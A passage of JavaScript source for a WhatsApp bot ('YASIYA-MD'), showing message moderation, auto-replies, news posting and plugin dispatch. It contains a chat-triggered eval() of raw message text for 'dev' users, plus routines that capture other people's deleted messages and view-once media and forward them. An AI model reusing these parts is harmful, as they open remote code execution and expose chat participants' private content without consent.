              ...(Array.isArray(config?.BAND_USERS) ? config.BAND_USERS : []).map(num => num.replace(/[^0-9]/g, ""))
            ];
            const isBanUser = bannedNumbers.includes(senderNumber);
            if (isBanUser && isCmd && !isDev) {
                
                const messageKey = mek?.key || {};
                
                if(isGroup && isBotAdmins){
                  await conn.sendMessage(from, { delete: mek.key });
                }

            await conn.sendMessage(from, {
              text: `*❌ You are banned from using commands...*\n\n*_Please contact the bot owner to remove your ban_* 👨‍🔧`,
              mentions: [sender]
            }, { quoted: mek }); 
                
              return;
            }

            const isOwners = isDev || isOwner || isMe || isSudo
            // --------------- OWNER-REACT ---------------
            const ownreact = config?.OWNER_REACT_EMOJI || `👾`
            const ownNum = config?.OWNER_NUMBER || '';
  
            if(senderNumber === ownNum && config?.OWNER_REACT === 'true' && !isDev){
            if(isReact) return 
            await m?.react(ownreact)
            }
            
            // --------------- AUTO-REACT ---------------
            if (config.AUTO_REACT === 'true' && !isDev && !isOwner) {
            
            const emojis = [
              '😀','😂','🥰','😎','😅','🤔','😭','😡','😱',
              '👍','👎','👏','🙌','🔥','💯','❤️','💔','💕','💖','💗','💘','💝','💞','💟',
              '✨','⚡','🌟','🎉','🎂','🍕','☕','🚀','⚽','🎧'
            ];

            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

            await conn.sendMessage(form, {
                react: {
                    text: randomEmoji,
                    key: mek.key
                }
            });
            }
            //--------------- WORK-TYPE ---------------         
            if ( config?.WORK_TYPE == "only_group" ) {
            if ( !isGroup && isCmd && !isOwners ) return
            }
        
            if ( config?.WORK_TYPE == "private" ) {
            if  ( isCmd && !isOwners && !isSudoGroup ) return
            }
  
            if ( config?.WORK_TYPE == "inbox" ) {
            if  (  isCmd && isGroup && !isOwners && !isSudoGroup ) return
            }      
        
            
            // --------------- CONFIG ---------------
            if (config?.AUTO_MSG_READ == "true"){
            await conn.readMessages([mek.key])
            }

            if (String(config?.ALLWAYS_ONLINE).toLowerCase() === "true") {
                await conn.sendPresenceUpdate("available", from);
            }

            if(config?.AUTO_RECODING === "true"){
            await conn.sendPresenceUpdate("recording", from);
            }

            if(config?.AUTO_TYPING === "true"){
            await conn.sendPresenceUpdate("composing", from);
            }

            if(config?.AI_MODE === 'true' && !isMe && !isCmd && (mek?.mentionUser.includes(botLid) || mek?.mentionUser.includes(botNumber2))){
                const ai = await axios.get('https://saviya-kolla-api.koyeb.app/ai/saviya-ai?query=' + body)
                await reply(ai?.data?.result?.data)
            }

            
            const anti_link_value = config?.ANTI_LINK_VALUE?.includes(',') 
              ? config?.ANTI_LINK_VALUE?.split(',') 
              : [config?.ANTI_LINK_VALUE];

            if (isGroup && config?.ANTI_LINK?.includes(from) && !isMe && !isAdmins && anti_link_value.some(link => body.toLowerCase().includes(link.toLowerCase()))) {
              try {

                if(!isBotAdmins) return reply('*The ANTI_LINK process is enabled in this group, but give it to a bot administrator to run. ⛔️*');
                if(isDev) return reply("*ANTI_LINK message found, but I can't remove the owners here. ❗️*");
                  
                await conn.sendMessage(from, {
                  delete: mek.key
                });
                  
                await conn.sendMessage(from, {
                  text: `🛑 *Anti-Link Activated!*\n@${senderNumber}, Your message was removed because it contained a restricted link.`,
                  mentions: [sender]
                });

                if(config?.ANTI_LINK_ACTION.toLowerCase() === 'kick'){
                    await conn.groupParticipantsUpdate(from, [sender], "remove");
                }
                  
              } catch (err) {
                console.error("Failed to delete anti-link message:", err);
              }
            }

            
            const anti_bad_value = config?.ANTI_BAD_VALUE === 'default' || config?.ANTI_BAD_VALUE === ''  ? await fetchJson(`https://raw.githubusercontent.com/${userName}/${repoName}/refs/heads/main/BOT-DATA/badWord.json`) :
              config?.ANTI_BAD_VALUE?.includes(',') ? config?.ANTI_BAD_VALUE?.split(',') 
              : [config?.ANTI_BAD_VALUE];

            if (isGroup && config?.ANTI_BAD?.includes(from) && !isMe && !isAdmins && anti_bad_value.some(link => body.toLowerCase().includes(link.toLowerCase()))) {
              try {

                if(body.includes('https://')) return
                if(!isBotAdmins) return reply('*The ANTI_BAD process is enabled in this group, but give it to a bot administrator to run. ⛔️*');
                if(isDev) return reply("*ANTI_BAD message found, but I can't remove the owners here. ❗️*");
                  
                await conn.sendMessage(from, {
                  delete: mek.key
                });
                  
                await conn.sendMessage(from, {
                  text: `🛑 *Anti-Bad Activated!*\n@${senderNumber}, Your message was removed because it contained a restricted word.`,
                  mentions: [sender]
                });

                if(config?.ANTI_BAD_ACTION.toLowerCase() === 'kick'){
                    await conn.groupParticipantsUpdate(from, [sender], "remove");
                }
                  
              } catch (err) {
                console.error("Failed to delete anti-bad message:", err);
              }
            }


            const anti_bot_value = dbData?.ANTI_BOT_VALUE;
            const anti_bot_caption = dbData?.ANTI_BOT_CAPTION;
            if (isGroup && !isMe && !isAdmins && (config?.ANTI_BOT?.includes(from) || anti_bot_value.includes(mek?.key?.id))) {
              try {

                //const allKeywordsPresent = anti_bot_caption.every((j) => body.includes(j));
                //if (!allKeywordsPresent) return;
                  
                if (!isBotAdmins)
                  return reply('*The ANTI_BOT process is enabled in this group, but give it to a bot administrator to run. ⛔️*');

                if (isDev)
                  return reply("*ANTI_BOT message found, but I can't remove the owners here. ❗️*");

                await conn.sendMessage(from, {
                  delete: mek.key,
                });

                await conn.sendMessage(from, {
                  text: `🛡️ *Anti-Bot System Triggered*\n@${senderNumber}, unauthorized bot-like activity is not allowed. You’ve been removed automatically for security purposes.`,
                  mentions: [sender],
                });

                await conn.groupParticipantsUpdate(from, [sender], 'remove');
              } catch (err) {
                console.error('Failed to delete anti-bad message:', err);
              }
            }

            //=============================================================================   

            async function mediaDownload(originalMessage, tempPath){
                const mediaBuffer = await downloadMediaMessage(originalMessage, tempPath);
                return mediaBuffer;
            }

            async function loadMessage(jid, msgId) {
                if (messageStore.has(jid)) {
                    return messageStore.get(jid).get(msgId);
                }
                return null;
            }

            function getExtension(mimetype) {
                const map = {
                    'image/jpeg': '.jpg',
                    'image/png': '.png',
                    'image/webp': '.webp',
                    'video/mp4': '.mp4',
                    'audio/mpeg': '.mp3',
                    'audio/ogg': '.ogg',
                    'application/pdf': '.pdf',
                    'application/zip': '.zip',
                    'application/vnd.openxmlformats-officedocument.wordprocessingml.document': '.docx',
                    'application/msword': '.doc'
                };
                return map[mimetype] || '';
            }
            
            
            // Revoked Message Handler
            async function handleMessageRevocation(revocationMessage, id, group) {
                let delfrom = config?.ANTI_DELETE_SEND ? config.ANTI_DELETE_SEND + "@s.whatsapp.net" : from;

                if (!revocationMessage?.key) return console.log("⚠️ Revocation message key is missing!");

                const remoteJid = revocationMessage.key.remoteJid;
                const messageId = id;

                if (!remoteJid || !messageId) return console.log("⚠️ Invalid revocation message data.");

                const chatData = await loadMessage(revocationMessage?.key?.remoteJid, messageId) || [];
                if (!chatData || chatData.length === 0) return console.log('⚠️ Original message not found for revocation.');

                const originalMessage = chatData;
                if (!originalMessage?.key) return console.log('⚠️ Message structure invalid.');

                originalMessage.message = originalMessage.message || {};

                const deletedBy = revocationMessage?.key?.remoteJid?.endsWith('@s.whatsapp.net') || revocationMessage?.key?.remoteJid?.endsWith('@lid')
                    ? revocationMessage.key.remoteJid.split('@')[0]
                    : revocationMessage?.key?.participant?.endsWith('@s.whatsapp.net') || revocationMessage?.key?.participant?.endsWith('@lid')
                        ? revocationMessage.key.participant.split('@')[0]
                        : from.split('@')[0];

                const sentBy = originalMessage?.sender
                    ? originalMessage.sender.split("@")[0]
                    : originalMessage?.key?.remoteJid?.endsWith('@s.whatsapp.net') || originalMessage?.key?.remoteJid?.endsWith('@lid')
                        ? originalMessage.key.remoteJid.split('@')[0]
                        : sender.split('@')[0];

                if (revocationMessage?.key?.remoteJid.endsWith("@g.us")) delfrom = revocationMessage?.key?.remoteJid;

                if (deletedBy.includes(botNumber)) return;
                //console.log(originalMessage)

                const xx = '```';
                try {
                    if (revocationMessage?.message?.protocolMessage?.editedMessage) {
                        await conn.sendMessage(delfrom, {
                            text: `🚫 *Edited message detected !!*\n\n   📩 *Sent by:* _${sentBy}_\n\n> 🔏 Edit message: ${xx}${revocationMessage?.msg?.editedMessage?.conversation}${xx}\n> 🔓 Original message: ${xx}${originalMessage?.message?.conversation || originalMessage.msg}${xx}`
                        });
                        
                    } else if (originalMessage?.type === "conversation" || originalMessage?.type === "extendedTextMessage") {
                        await conn.sendMessage(delfrom, {
                            text: `🚫 *This message was deleted !!*\n\n   🚮 *Deleted by:* _${deletedBy}_\n   📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.body || originalMessage.msg}${xx}`
                        });

                    } else if (originalMessage?.type === "imageMessage") {
                        const caption = originalMessage?.msg?.caption || '';
                        const tempPath = `./${Date.now()}`;
                        const ext = getExtension(originalMessage?.msg?.mimetype) || ".jpg";
                        const buffer = await mediaDownload(originalMessage, tempPath);
                        await conn.sendMessage(delfrom, {
                            image: buffer,
                            caption: `🚫 *This message was deleted !!*\n\n   🚮 *Deleted by:* _${deletedBy}_\n   📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Caption: ${caption}`
                        });
                            const fullPath = tempPath + ext;
                            if (fs.existsSync(fullPath)) {
                                    fs.unlinkSync(fullPath);
                                }

                    } else if (originalMessage?.type === "videoMessage") {
                        const caption = originalMessage?.msg?.caption || '';
                        const tempPath = `./${Date.now()}`;
                        const ext = getExtension(originalMessage?.msg?.mimetype) || ".mp4";
                        const buffer = await mediaDownload(originalMessage, tempPath);
                        await conn.sendMessage(delfrom, {
                            video: buffer,
                            caption: `🚫 *This message was deleted !!*\n\n   🚮 *Deleted by:* _${deletedBy}_\n   📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Caption: ${caption}`
                        });
                            const fullPath = tempPath + ext;
                            if (fs.existsSync(fullPath)) {
                                    fs.unlinkSync(fullPath);
                                }

                    } else if (originalMessage?.type === "documentMessage") {
                        const tempPath = `./${Date.now()}`;
                        const ext = getExtension(originalMessage?.msg?.mimetype) || ".apocalypse";
                        const buffer = await mediaDownload(originalMessage, tempPath);
                        await conn.sendMessage(delfrom, {
                            document: buffer,
                            mimetype: originalMessage?.msg?.mimetype,
                            fileName: originalMessage?.msg?.fileName,
                            caption: `🚫 *This message was deleted !!*\n\n   🚮 *Deleted by:* _${deletedBy}_\n   📩 *Sent by:* _${sentBy}_`
                        });
                            const fullPath = tempPath + ext;
                            if (fs.existsSync(fullPath)) {
                                    fs.unlinkSync(fullPath);
                                }

                    } else if (originalMessage?.type === "audioMessage") {
                        const tempPath = `./${Date.now()}`;
                        const ext = getExtension(originalMessage?.msg?.mimetype) || ".mp3";
                        const buffer = await mediaDownload(originalMessage, tempPath);
                        const smsg = await conn.sendMessage(delfrom, {
                            audio: buffer,
                            mimetype: originalMessage?.msg?.mimetype,
                            fileName: `${originalMessage.key.id}.mp3`,
                            caption: `🚫 *This message was deleted !!*\n\n   🚮 *Deleted by:* _${deletedBy}_\n   📩 *Sent by:* _${sentBy}_`
                        });
                        
                        await conn.sendMessage(delfrom, {
                            text: `🚫 *This voice message was deleted !!*\n\n   🚮 *Deleted by:* _${deletedBy}_\n   📩 *Sent by:* _${sentBy}_`
                        }, { quoted: smsg });
                            const fullPath = tempPath + ext;
                            if (fs.existsSync(fullPath)) {
                                    fs.unlinkSync(fullPath);
                                }

                    } else if (originalMessage?.type === "stickerMessage") {
                        const tempPath = `./${Date.now()}`;
                        const ext = getExtension(originalMessage?.msg?.mimetype) || ".webp";
                        const buffer = await mediaDownload(originalMessage, tempPath);
                        const smsg = await conn.sendMessage(delfrom, {
                            sticker: buffer,
                            package: '🌟 YASIYA-MD 🌟'
                        });

                        await conn.sendMessage(delfrom, {
                            text: `🚫 *This sticker message was deleted !!*\n\n   🚮 *Deleted by:* _${deletedBy}_\n   📩 *Sent by:* _${sentBy}_`
                        }, { quoted: smsg });
                            const fullPath = tempPath + ext;
                            if (fs.existsSync(fullPath)) {
                                    fs.unlinkSync(fullPath);
                                }

                    } else {
                        console.log('⚠️ No matching message type found for deleted message.');
                    }
                } catch (error) {
                    console.error("❌ Error while handling deleted message:", error);
                }
            }



            if (config?.ANTI_DELETE === 'true' && !isReact && !isOwners && (isPrivate || (isGroup && !isAdmins))) {
                  if ((config?.ANTI_DELETE_WORK === 'only_private' && isGroup) || (config?.ANTI_DELETE_WORK === 'only_group' && isPrivate)) {
                      return;
                  }
                
                if (mek?.msg?.type === 0) {
                    await handleMessageRevocation(mek, mek?.msg?.key?.id);
                } else if(mek?.msg?.type === 14) {
                    console.log(mek);
                    await handleMessageRevocation(mek, mek?.msg?.key?.id);
                }
            }

            
            if (body.toLowerCase().startsWith('button')) {
                try {
                    if (!isOwners) return await reply("🚫 *Permission Denied!*");
                    const args = body.split(' ');
                    const mode = args[1]?.toLowerCase();

                    if (!mode) return await reply("*⚠️ Please specify `on` or `off`.*");
                    let current = await ymd_db.get(dbData?.tableName, "MESSAGE_TYPE");

                    if (mode === 'on') {
                        if (current?.toLowerCase() === 'button')
                            return await reply("*✅ MESSAGE_TYPE is already set to BUTTON.*");

                        await ymd_db.input(dbData?.tableName, "MESSAGE_TYPE", 'BUTTON');
                        await reply("*🔁 MESSAGE_TYPE UPDATED:*\n\n👨🏻‍🔧 ➠ [ BUTTON ]");
                        await conn.sendMessage(from, { react: { text: `✔`, key: mek.key } });

                    } else if (mode === 'off') {
                        if (current?.toLowerCase() === 'non-button')
                            return await reply("*✅ MESSAGE_TYPE is already set to NON-BUTTON.*");

                        await ymd_db.input(dbData?.tableName, "MESSAGE_TYPE", 'NON-BUTTON');
                        await reply("*🔁 MESSAGE_TYPE UPDATED:*\n\n👨🏻‍🔧 ➠ [ NON-BUTTON ]");
                        await conn.sendMessage(from, { react: { text: `✔`, key: mek.key } });

                    } else {
                        return await reply("*⚠️ Invalid option. Use `button on` or `button off`.*");
                    }
                } catch (error) {
                    console.error("Error updating MESSAGE_TYPE:", error);
                    return await reply("*❌ An unexpected error occurred while updating MESSAGE_TYPE.*");
                }
            }

            if (['save', 'statussave', 'oni', 'send', 'evpn', 'dpn', 'dano', 'evano', 'දාපන්', 'එවනො', 'එවපන්', 'දානො'].includes(body.toLowerCase())) {
                try {
                    if (m.quoted?.type === 'videoMessage') {
                        await conn.sendMessage(from, {
                            video: await m.quoted.download(),
                            caption: m.quoted.videoMessage?.caption || '',
                            mimetype: m.quoted.videoMessage?.mimetype || 'video/mp4'
                        }, { quoted: mek });

                    } else if (m.quoted?.type === 'imageMessage' || m.quoted?.type === 'viewOnceMessageV2') {
                        await conn.sendMessage(from, {
                            image: await m.quoted.download(),
                            caption: m.quoted.imageMessage?.caption || ''
                        }, { quoted: mek });

                    } else {
                        await reply('*⚠️ Please reply to an image or video message.*');
                    }

                } catch (error) {
                }
            }

                    if((isOwners) && body.toLowerCase() === "prefix") {
                    await reply(prefix ? `_Use this prefix to execute commands:- *${prefix}*_` : "Prefix is not set.");
                    } 
            //==================================plugin map================================
            const events = require('./command')
            const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
            if (isCmd) {
                const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
                if (cmd) {
                    if (cmd.react) await conn.sendMessage(from, {
                        react: {
                            text: cmd.react,
                            key: mek.key
                        }
                    })

                    try {
                        cmd.function(conn, mek, m, {
                            from,
                            prefix,
                            quoted,
                            body,
                            isCmd,
                            command,
                            args,
                            q,
                            quotedText,
                            isGroup,
                            sender,
                            senderNumber,
                            botNumber2,
                            botNumber,
                            pushname,
                            isMe,
                            isOwner,
                            groupMetadata,
                            groupName,
                            participants,
                            groupAdmins,
                            isBotAdmins,
                            isAdmins,
                            reply,
                            l,
                            isDev,
                            isOwners,
                            userName,
                            repoName,
                            botLid, 
                            botLid2
                        });
                    } catch (e) {
                        console.error("[PLUGIN ERROR] ", e);
                    }
                }
            }
            events.commands.map(async (command) => {
                if (body && command.on === "body") {
                    command.function(conn, mek, m, {
                        from,
                        prefix,
                        quoted,
                        body,
                        isCmd,
                        command,
                        args,
                        q,
                        quotedText,
                        isGroup,
                        sender,
                        senderNumber,
                        botNumber2,
                        botNumber,
                        pushname,
                        isMe,
                        isOwner,
                        groupMetadata,
                        groupName,
                        participants,
                        groupAdmins,
                        isBotAdmins,
                        isAdmins,
                        reply,
                        l,
                        isDev,
                        isOwners,
                        userName,
                        repoName,
                        botLid,
                        botLid2
                    })
                } else if (mek.q && command.on === "text") {
                    command.function(conn, mek, m, {
                        from,
                        quoted,
                        body,
                        isCmd,
                        command,
                        args,
                        q,
                        quotedText,
                        isGroup,
                        sender,
                        senderNumber,
                        botNumber2,
                        botNumber,
                        pushname,
                        isMe,
                        isOwner,
                        groupMetadata,
                        groupName,
                        participants,
                        groupAdmins,
                        isBotAdmins,
                        isAdmins,
                        reply, 
                        l,
                        isDev,
                        isOwners,
                        userName,
                        repoName,
                        botLid,
                        botLid2
                    })
                } else if (
                    (command.on === "image" || command.on === "photo") &&
                    mek.type === "imageMessage"
                ) {
                    command.function(conn, mek, m, {
                        from,
                        prefix,
                        quoted,
                        body,
                        isCmd,
                        command,
                        args,
                        q,
                        quotedText,
                        isGroup,
                        sender,
                        senderNumber,
                        botNumber2,
                        botNumber,
                        pushname,
                        isMe,
                        isOwner,
                        groupMetadata,
                        groupName,
                        participants,
                        groupAdmins,
                        isBotAdmins,
                        isAdmins,
                        reply,
                        l,
                        isDev,
                        isOwners,
                        userName,
                        repoName,
                        botLid,
                        botLid2
                    })
                } else if (
                    command.on === "sticker" &&
                    mek.type === "stickerMessage"
                ) {
                    command.function(conn, mek, m, {
                        from,
                        prefix,
                        quoted,
                        body,
                        isCmd,
                        command,
                        args,
                        q,
                        quotedText,
                        isGroup,
                        sender,
                        senderNumber,
                        botNumber2,
                        botNumber,
                        pushname,
                        isMe,
                        isOwner,
                        groupMetadata,
                        groupName,
                        participants,
                        groupAdmins,
                        isBotAdmins,
                        isAdmins,
                        reply,
                        l,
                        isDev,
                        isOwners,
                        userName,
                        repoName,
                        botLid,
                        botLid2
                    })
                }
            });

            switch (command) {
                case 'device2': {
                    let deviceq = getDevice(mek.message.extendedTextMessage.contextInfo.stanzaId)

                    await reply("*He Is Using* _*Whatsapp " + deviceq + " version*_")
                }
                  break

                case "updatev2": {
                      try {

                    await m.react("🔁");
                    if (!isDev) return

                    const msg = await conn.sendMessage(from, { text: 'Removing Exiter File...' }, { quoted: mek });

                    // Lib Folder Delete (Check if exists)
                    if (fs.existsSync("./lib")) {
                        fs.rmSync("./lib", { recursive: true, force: true });
                        await conn.sendMessage(from, { text: '✅ Lib folder removed.', edit: msg.key });
                    } else {
                        await conn.sendMessage(from, { text: '⚠️ Lib folder not found.', edit: msg.key });
                    }

                    // Plugins Folder Delete (Check if exists)
                    if (fs.existsSync("./plugins")) {
                        fs.rmSync("./plugins", { recursive: true, force: true });
                        await conn.sendMessage(from, { text: '✅ Plugins folder removed.', edit: msg.key });
                    } else {
                        await conn.sendMessage(from, { text: '⚠️ Plugins folder not found.', edit: msg.key });
                    }

                    // index.js Delete (Check if exists)
                    if (fs.existsSync("index.js")) {
                        fs.unlinkSync("index.js");
                        await conn.sendMessage(from, { text: '✅ index.js removed.', edit: msg.key });
                    } else {
                        await conn.sendMessage(from, { text: '⚠️ index.js not found.', edit: msg.key });
                    }

                    // Restart Bot
                    await conn.sendMessage(from, { text: '🔄 Restarting Bot...', edit: msg.key });
                    exec("pm2 restart " + require("./package.json").name || 'yasiya-md' );

                        } catch (error) {
                          console.error("Update failed:", error);
                          await conn.sendMessage(from, { text: '❌ Update Failed! Check Logs.' });
                      }}
    
                    
               default:
               if ((isDev) && body.startsWith('^')) {
                 let bodyy = body.split('^')[1]
                 let code2 = bodyy.replace("°", ".toString()");
                    try {
                 let resultTest = await eval(code2);
                 if (typeof resultTest === "object") {
                 await reply(util.format(resultTest));
                   } else {
                 reply(util.format(resultTest));
                   }
                 } catch (err) {
                 await reply(util.format(err));
               }}
            }

            
        } catch (e) {
            const isError = String(e)
            console.log(isError)
        }
    })

           //======================================== AUTO NEWS ========================================\\

           const dbPath = path.join(__dirname, 'autonews-store.json');

           // Load DB from JSON
           const loadDB = () => {
             if (!fs.existsSync(dbPath)) {
               fs.writeFileSync(dbPath, JSON.stringify({}));
             }
             return JSON.parse(fs.readFileSync(dbPath, 'utf-8'));
           };

           // Save DB to JSON
           const saveDB = (data) => {
             fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
           };

           // 🔹 Set key-value
           const setStore = async (key, value) => {
             const db = loadDB();
             db[key] = value;
             saveDB(db);
           };

           // 🔹 Get value by key
           const getStore = async (key) => {
             const db = loadDB();
             return db[key] ?? null;
           }

           const libPath = path.join(__dirname, 'lib');

           setInterval(async () => {
               try{
                   
                   const jids = config?.AUTO_NEWS?.HIRUNEWS_SEND_JIDS || [];
                   if(jids.length === 0) return
                   
             if (fs.existsSync(libPath) && fs.statSync(libPath).isDirectory()) {
                 const { hirunews } = require('./lib/scraper');
                 const data = await hirunews();
                 const latestUrl = await getStore("HIRUNEWS_URL");
                 const { title, image, date, desc, url } = data.result;
                 const caption = (config.AUTO_NEWS_MESSAGE !== 'default') ? formatMessage(config.AUTO_NEWS_MESSAGE, {  title, image, date, desc, url }) :
        
                                 `\`📰 ${title}\`\n\n` +
                                 `📅 Date: _${date}_\n\n` +
                                 `🔗 Link: ${url}\n\n` +
                                 `${desc}\n\n` +
                                 `━━━━━━━━━━━━━━━\n\n` +
                                 '> • ʏᴍᴅ - ᴀᴜᴛᴏ ɴᴇᴡꜱ ꜱᴇɴᴅᴇʀ •';


                 if(latestUrl !== url){
                     for(let jid of jids){
                     await conn.sendMessage(jid, { image: { url: image }, caption: caption });
                    }
                     await setStore("HIRUNEWS_URL", url);
                 }
             }
                   
               } catch(error){
                   console.error('❌ [Error Hiru Auto News] → ', error);
               }
               
           }, 1000 * 60 * 5);

           
            setInterval(async () => {
               try{

                    const jids = config?.AUTO_NEWS?.SIRASANEWS_SEND_JIDS || [];
                    if(jids.length === 0) return
                   
             if (fs.existsSync(libPath) && fs.statSync(libPath).isDirectory()) {
                 const { sirasanews } = require('./lib/scraper');
                 const data = await sirasanews();
                 const latestUrl = await getStore("SIRASANEWS_URL");
                 const { title, image, date, desc, url } = data.result;
                 const caption = (config.AUTO_NEWS_MESSAGE !== 'default') ? formatMessage(config.AUTO_NEWS_MESSAGE, {  title, image, date, desc, url }) :
        
                                 `\`📰 ${title}\`\n\n` +
                                 `📅 Date: _${date}_\n\n` +
                                 `🔗 Link: ${url}\n\n` +
                                 `${desc}\n\n` +
                                 `━━━━━━━━━━━━━━━\n\n` +
                                 '> • ʏᴍᴅ - ᴀᴜᴛᴏ ɴᴇᴡꜱ ꜱᴇɴᴅᴇʀ •';


                 if(latestUrl !== url){
                     for(let jid of jids){
                     await conn.sendMessage(jid, { image: { url: image }, caption: caption });
                    }
                     await setStore("SIRASANEWS_URL", url);
                 }
             }

               } catch(error){
                   console.error('❌ [Error Sirasa Auto News] → ', error);
               }
    
           }, 1000 * 60 * 5);


            setInterval(async () => {
               try{

                   const jids = config?.AUTO_NEWS?.DERANANEWS_SEND_JIDS || [];
                   if(jids.length === 0) return
                   
             if (fs.existsSync(libPath) && fs.statSync(libPath).isDirectory()) {
                 const { derananews } = require('./lib/scraper');
                 const data = await derananews();
                 const latestUrl = await getStore("DERANANEWS_URL");
                 const { title, image, date, desc, url } = data.result;
                 const caption = (config.AUTO_NEWS_MESSAGE !== 'default') ? formatMessage(config.AUTO_NEWS_MESSAGE, {  title, image, date, desc, url }) :
        
                                 `\`📰 ${title}\`\n\n` +
                                 `📅 Date: _${date}_\n\n` +
                                 `🔗 Link: ${url}\n\n` +
                                 `${desc}\n\n` +
                                 `━━━━━━━━━━━━━━━\n\n` +
                                 '> • ʏᴍᴅ - ᴀᴜᴛᴏ ɴᴇᴡꜱ ꜱᴇɴᴅᴇʀ •';


                 if(latestUrl !== url){
                     for(let jid of jids){
                     await conn.sendMessage(jid, { image: { url: image }, caption: caption });
                    }
                     await setStore("DERANANEWS_URL", url);
                 }
             }

               } catch(error){
                   console.error('❌ [Error Derana Auto News] → ', error);
               }
    
           }, 1000 * 60 * 5);


           if(process.env.RENDER_URL){
           setInterval(async () => {
             await fetch(process.env.RENDER_URL || "https://yasiya-md-x48q.onrender.com/") // Render app URL
               .then(() => console.log("Self ping OK"))
               .catch(err => console.error("Ping failed:", err));
           }, 12 * 60 * 1000); // every 12 minutes
        }


           
}


app.get("/", (req, res) => {
    res.send("📟 YASIYA-MD Working successfully!");
});

    
app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

setTimeout(async () => {
    await connectToWA()
}, 1000 * 5);
    
process.on("uncaughtException", function (err) {
  let e = String(err);
  if (e.includes("Socket connection timeout")) return;
  if (e.includes("rate-overlimit")) return;
  if (e.includes("Connection Closed")) return;
  if (e.includes("Value not found")) return;
  if (e.includes("Authentication timed out")) restart();
  console.log("Caught exception: ", err);
});   
 }

module.exports = yasiyaMd;








































































































